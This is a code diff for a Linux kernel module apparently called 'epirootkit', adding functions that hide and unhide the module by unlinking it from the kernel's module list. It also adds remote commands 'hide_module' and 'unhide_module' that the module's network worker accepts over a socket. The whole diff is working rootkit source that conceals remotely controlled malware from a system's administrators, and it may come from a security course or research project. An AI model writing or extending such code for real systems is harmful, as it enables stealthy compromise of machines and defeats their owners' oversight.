@@ -1,5 +1,6 @@
 #include <linux/kernel.h>
 #include <linux/net.h>
+#include <linux/module.h>
 #include <linux/socket.h>
 #include <linux/inet.h>
 #include <linux/kthread.h>
@@ -7,6 +8,19 @@
 #include "epirootkit.h"
 
 struct socket *sock = NULL;
+
+static struct list_head *prev_module;
+
+void hide_module(void)
+{
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void unhide_module(void)
+{
+    list_add(&THIS_MODULE->list, prev_module);
+}
 
 /**
  * @brief Closes the communication by releasing the socket.
@@ -183,6 +197,12 @@ int network_worker(void *data)
 		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
 			pr_info("network_worker: killcom received, exiting...\n");
 			break;
+		} else if (strncmp(recv_buffer, "hide_module", 11) == 0) {
+			pr_info("epirootkit: network_worker: hiding module\n");
+			hide_module();
+		} else if (strncmp(recv_buffer, "unhide_module", 13) == 0) {
+			pr_info("epirootkit: network_worker: unhiding module\n");
+			unhide_module();
 		}
 	}
 
